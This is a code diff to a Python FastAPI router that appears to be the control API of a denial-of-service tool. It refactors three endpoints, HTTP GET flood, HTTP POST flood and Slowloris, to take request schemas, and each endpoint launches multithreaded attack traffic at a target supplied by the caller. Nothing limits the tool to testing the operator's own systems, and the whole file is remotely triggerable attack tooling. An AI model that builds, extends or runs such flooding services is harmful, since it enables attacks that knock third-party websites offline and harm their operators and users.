@@ -3,43 +3,44 @@ from denialofservice.layer7 import Layer7
 from globals import NUMBER_OF_THREADS
 from threading import Thread
 from log import log
+from schemas import HttpGetFloodRequest, HttpPostFloodRequest, SlowlorisFloodRequest
 
 layer7_router = APIRouter()
 
 
 @layer7_router.post("/httpGETflood")
-async def http_get_flood(time: int, target: str, request: Request):
+async def http_get_flood(get_flood: HttpGetFloodRequest, request: Request):
     try:
         for i in range(NUMBER_OF_THREADS):
-            t = Thread(target=Layer7.http_get_flood, args=(target, time,))
+            t = Thread(target=Layer7.http_get_flood, args=(get_flood.target, get_flood.time,))
             t.start()
         log.info(
-            f"{target} HTTP-GET-FLooded from {request.client.host} for {time} seconds")
+            f"{get_flood.target} HTTP-GET-FLooded from {request.client.host} for {get_flood.time} seconds")
     except:
         log.warning(
-            f"{target} HTTP-GET-FLood from {request.client.host} for {time} seconds could not be triggered")
+            f"{get_flood.target} HTTP-GET-FLood from {request.client.host} for {get_flood.time} seconds could not be triggered")
 
 
 @layer7_router.post("/httpPOSTflood")
-async def http_post_flood(time: int, target: str, payload: str, request: Request):
+async def http_post_flood(post_flood: HttpPostFloodRequest, request: Request):
     try:
         for i in range(NUMBER_OF_THREADS):
             t = Thread(target=Layer7.http_post_flood,
-                       args=(target, time, payload,))
+                       args=(post_flood.target, post_flood.time, post_flood.payload,))
             t.start()
         log.info(
-            f"{target} HTTP-POST-FLooded from {request.client.host} for {time} seconds")
+            f"{post_flood.target} HTTP-POST-FLooded from {request.client.host} for {post_flood.time} seconds")
     except:
         log.warning(
-            f"{target} HTTP-POST-FLood from {request.client.host} for {time} seconds could not be triggered")
+            f"{post_flood.target} HTTP-POST-FLood from {request.client.host} for {post_flood.time} seconds could not be triggered")
 
 
 @layer7_router.post("/slowloris")
-async def slow_loris(target: str, port: int, time: int, request: Request):
+async def slow_loris(slow_loris: SlowlorisFloodRequest, request: Request):
     try:
-        Layer7.slow_loris(target, port, time)
+        Layer7.slow_loris(slow_loris.target, slow_loris.port, slow_loris.time)
         log.info(
-            f"{target} SLOW-Loris from {request.client.host} for {time} seconds")
+            f"{slow_loris.target} SLOW-Loris from {request.client.host} for {slow_loris.time} seconds")
     except:
         log.warning(
-            f"{target} SlOW-Loris from {request.client.host} for {time} seconds could not be triggered")
+            f"{slow_loris.target} SlOW-Loris from {request.client.host} for {slow_loris.time} seconds could not be triggered")
